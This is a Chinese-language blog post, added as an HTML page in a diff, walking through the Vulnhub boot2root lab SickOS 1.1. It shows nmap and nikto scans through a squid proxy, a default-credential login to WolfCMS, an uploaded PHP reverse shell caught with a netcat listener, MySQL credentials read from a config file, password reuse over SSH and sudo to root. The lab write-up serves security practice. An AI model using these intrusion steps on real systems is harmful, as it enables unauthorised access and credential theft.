@@ -1,0 +1,353 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>SickOS 1.1 - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="SickOs from Vulnhub nmap 先掃一遍目標 root@kali:~/_Sec/sick# nmap -sS -Pn 192.168.2.164 -p-
+...
+PORT STATE SERVICE
+22/tcp open ssh
+3128/tcp open squid-http &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2015/12/19/sicoks1.1/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">SickOS 1.1</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-12-19T00:57:45+08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:57 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<p>nmap 先掃一遍目標</p>
+
+<pre><code>root@kali:~/_Sec/sick# nmap -sS -Pn 192.168.2.164 -p-
+...
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+3128/tcp open   squid-http
+</code></pre>
+
+<p>用瀏覽器連上3128 port之後，會發現架了一個squid-proxy</p>
+
+<p><img class="center" src="/images/2015-12-19-sickos1.1/nmap.png"></p>
+
+<p>透過這個proxy就能用瀏覽器連上 <a href="http://192.168.2.164">http://192.168.2.164</a></p>
+
+<p><img class="center" src="/images/2015-12-19-sickos1.1/bleh.png"></p>
+
+<p>這個首頁的原始碼空無一物，先拿nikto來掃看看有沒有漏洞</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sick# nikto -h http://192.168.2.164 -useproxy http://192.168.2.164:3128
+...
++ <span class="s2">&quot;robots.txt&quot;</span> contains <span class="m">1</span> entry which should be manually viewed.</code></pre></div>
+
+
+<p>掃描結果發現有robots.txt，打開來看會得到/wolfcms這個路徑，是個用wolfcms架的blog</p>
+
+<p><img class="center" src="/images/2015-12-19-sickos1.1/wolf.png"></p>
+
+<p>google wolfcms exploit之後，看到了這個<a href="https://www.exploit-db.com/exploits/38000/">漏洞</a></p>
+
+<p>但要實際運用必須要先能夠登入，於是來到了登入畫面。</p>
+
+<p>然後！！！！！</p>
+
+<p>猜了五分鐘，最後終於用admin:admin成功登入了</p>
+
+<p><img class="center" src="/images/2015-12-19-sickos1.1/admin.png"></p>
+
+<p>再來就要嘗試剛剛找到的poc有沒有效果</p>
+
+<p>上傳一個revershell.php，並在攻擊端設好等待連線之後，再從瀏覽器去瀏覽剛剛上傳的php檔</p>
+
+<p>就成功拿到www-data的shell了</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sick# nc -lp 4112
+Linux SickOs 3.11.0-15-generic <span class="c">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span>
+ 23:58:32 up  4:11,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+<span class="err">$</span></code></pre></div>
+
+
+<p>檢查一下/etc/passwd，發現有個sickos的帳號</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@SickOs:/<span class="nv">$ </span>cat /etc/passwd <span class="p">|</span> grep bash
+cat /etc/passwd <span class="p">|</span> grep bash
+root:x:0:0:root:/root:/bin/bash
+sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash</code></pre></div>
+
+
+<p>到sickos的家目錄逛一下，.bashrc和.profile沒甚麼有用的資訊，.bash_history沒權限</p>
+
+<p>接著去逛逛架站的/var/www目錄，在/wolfcms/config.php會發現連入mysql用的帳密</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@SickOs:/var/www/wolfcms<span class="nv">$ </span>cat config
+define<span class="o">(</span><span class="s1">&#39;DB_DSN&#39;</span>, <span class="s1">&#39;mysql:dbname=wolf;host=localhost;port=3306&#39;</span><span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span><span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;root&#39;</span><span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span><span class="s1">&#39;DB_PASS&#39;</span>, <span class="s1">&#39;john@123&#39;</span><span class="o">)</span><span class="p">;</span></code></pre></div>
+
+
+<p>用這組帳密登入mysql後到處逛逛，最後在mysql.user這張表發現從sickos這個host登入用的帳密</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@SickOs:/var/www/wolfcms<span class="nv">$ </span>mysql -uroot -pjohn@123
+...
+mysql&gt; <span class="k">select</span> host,user,password from mysql.user<span class="p">;</span>
+<span class="k">select</span> host,user,password from mysql.user<span class="p">;</span>
++-----------+------------------+-------------------------------------------+
+<span class="p">|</span> host      <span class="p">|</span> user             <span class="p">|</span> password                                  <span class="p">|</span>
++-----------+------------------+-------------------------------------------+
+<span class="p">|</span> localhost <span class="p">|</span> root             <span class="p">|</span> *A7A20B93EC076311A63BF86B5C705B25C054DD77 <span class="p">|</span>
+<span class="p">|</span> sickos    <span class="p">|</span> root             <span class="p">|</span> *A7A20B93EC076311A63BF86B5C705B25C054DD77 <span class="p">|</span>
+<span class="p">|</span> 127.0.0.1 <span class="p">|</span> root             <span class="p">|</span> *A7A20B93EC076311A63BF86B5C705B25C054DD77 <span class="p">|</span>
+<span class="p">|</span> ::1       <span class="p">|</span> root             <span class="p">|</span> *A7A20B93EC076311A63BF86B5C705B25C054DD77 <span class="p">|</span>
+<span class="p">|</span> localhost <span class="p">|</span> debian-sys-maint <span class="p">|</span> *CB98094782C386F2459D65D97B17D1DE15D1654B <span class="p">|</span>
++-----------+------------------+-------------------------------------------+
+<span class="m">5</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span></code></pre></div>
+
+
+<p>雖然密碼是加密過的，不過跟我們知道目前登入mysql用的密碼就是john@123</p>
+
+<p>用這組密碼就能成功從ssh登入sickos的帳號了</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@SickOs:/var/www/wolfcms<span class="nv">$ </span>ssh sickos@192.168.2.164
+ssh sickos@192.168.2.164
+The authenticity of host <span class="s1">&#39;192.168.2.164 (192.168.2.164)&#39;</span> can<span class="s1">&#39;t be established.</span>
+<span class="s1">ECDSA key fingerprint is 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27.</span>
+<span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
+<span class="s1">yes</span>
+<span class="s1">Warning: Permanently added &#39;</span>192.168.2.164<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
+<span class="s1">sickos@192.168.2.164&#39;</span>s password: john@123
+
+...
+Last login: Fri Dec <span class="m">18</span> 22:52:51 <span class="m">2015</span> from 192.168.2.145
+sickos@SickOs:~<span class="err">$</span></code></pre></div>
+
+
+<p>登入後就可以看到.bash_history裡有用過sudo su的紀錄</p>
+
+<p>執行後就拿到root的權限，最後就是抓flag了</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">sickos@SickOs:~<span class="nv">$ </span>sudo su
+sudo su
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> sickos: john@123
+
+root@SickOs:/home/sickos# ls -al /root
+ls -al /root
+total 40
+drwx------  <span class="m">3</span> root root <span class="m">4096</span> Dec  <span class="m">6</span> 21:14 .
+drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Sep <span class="m">22</span> 08:13 ..
+-rw-r--r--  <span class="m">1</span> root root   <span class="m">96</span> Dec  <span class="m">6</span> 07:27 a0216ea4d51874464078c618298b1367.txt
+-rw-------  <span class="m">1</span> root root <span class="m">3783</span> Dec <span class="m">18</span> 23:57 .bash_history
+-rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Apr <span class="m">19</span>  <span class="m">2012</span> .bashrc
+drwx------  <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">22</span> 08:33 .cache
+-rw-------  <span class="m">1</span> root root   <span class="m">22</span> Dec  <span class="m">5</span> 06:24 .mysql_history
+-rw-r--r--  <span class="m">1</span> root root  <span class="m">140</span> Apr <span class="m">19</span>  <span class="m">2012</span> .profile
+-rw-------  <span class="m">1</span> root root <span class="m">5230</span> Dec  <span class="m">6</span> 21:14 .viminfo
+root@SickOs:/home/sickos# cat /root/a0216ea4d51874464078c618298b1367.txt
+cat /root/a0216ea4d51874464078c618298b1367.txt
+If you are viewing this!!
+
+ROOT!
+
+You have Succesfully completed SickOS1.1.
+Thanks <span class="k">for</span> Trying
+
+
+root@SickOs:/home/sickos#</code></pre></div>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-12-19T00:57:45+08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:57 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2015/12/19/sicoks1.1/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2015/12/19/sicoks1.1/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/04/16/rop-primer/" title="Previous Post: ROP-Primer Level 0">&laquo; ROP-Primer Level 0</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/12/19/the_wall_1/" title="Next Post: The Wall: 1">The Wall: 1 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>最近文章</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/06/17/stapler_1/">Stapler: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/05/03/google_advanced_search_operators/">Google Adavanced Search Operators</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/26/lord_of_root/">Lord of the Root</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/23/pipe/">/dev/random: Pipe</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/20/sleepy/">/dev/random: Sleepy</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
